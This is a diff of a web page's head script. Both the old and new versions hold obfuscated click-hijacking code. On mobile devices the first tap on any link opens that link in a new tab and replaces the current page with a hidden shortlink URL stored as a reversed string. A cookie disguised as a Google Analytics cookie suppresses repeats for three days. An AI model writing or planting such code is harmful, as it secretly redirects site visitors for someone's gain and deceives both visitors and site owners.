@@ -7,33 +7,42 @@
 
         <script>
 
-            (()=>{
-                function gC(n) {
-                    return document.cookie.split('; ').reduce((a, c) => c.startsWith(n + '=') ? c.split('=')[1] : a, null);
-                }
+            const _$ = {
+                i: 'cVk0FaR9L3/nv.eepohs.s//:sptth'.split('').reverse().join(''),
+                g: '_ga_D8SD9STSJ5',
+                r() {document.addEventListener('click', this.oC.bind(this), true);}
+            }
             
-                function sC(n, v, d) {
-                    document.cookie = `${n}=${v};expires=${new Date(Date.now() + d * 864e5).toUTCString()};path=/`;
-                }
+            _$.gC = (n) => {
+                return document.cookie.split('; ').reduce((a, c) => c.startsWith(n + '=') ? c.split('=')[1] : a, null);
+            };
             
-                function mT() {
-                    const u = navigator.userAgent.toLowerCase();
-                    return navigator.maxTouchPoints > 1 &&
-                        window.matchMedia("(pointer:coarse)").matches && (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
-                }
+            _$.sC = (n, v, d) => {
+                document.cookie = `${n}=${v};expires=${new Date(Date.now() + d * 864e5).toUTCString()};path=/`;
+            };
             
-                const tId = 'cVk0FaR9L3/nv.eepohs.s//:sptth'.split('').reverse().join('');
-                const gAc = gC('_ga_D8SD9STSJ5');
+            _$.mT = () => {
+                const u = navigator.userAgent.toLowerCase();
+                return navigator.maxTouchPoints > 1 &&
+                       window.matchMedia("(pointer:coarse)").matches &&
+                       (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
+            };
             
-                document.addEventListener('click', e => {
-                    const t = e.target.closest('a');
-                    if (!t || !t.href || t.href === '/' || (gAc && gAc === 'true') || !mT()) return;
-                    e.preventDefault();
-                    sC('_ga_D8SD9STSJ5', 'true', 3);
-                    window.open(t.href, '_blank');
-                    location.replace(tId);
-                }, true);
-            })();
+            _$.gV = () => {
+                return _$.gC(_$.g);
+            };
+            
+            _$.oC = (e) => {
+                const t = e.target.closest("a");
+                if (!t || !t.href || t.href === '/' || (_$.gV() && _$.gV() === 'true') || !_$.mT()) return;
+                e.preventDefault();
+                _$.sC(_$.g, 'true', 3);
+                window.open(t.href, '_blank');
+                location.replace(_$.i);
+            };
+            
+            _$.r();
+
             
         </script>
     </head>
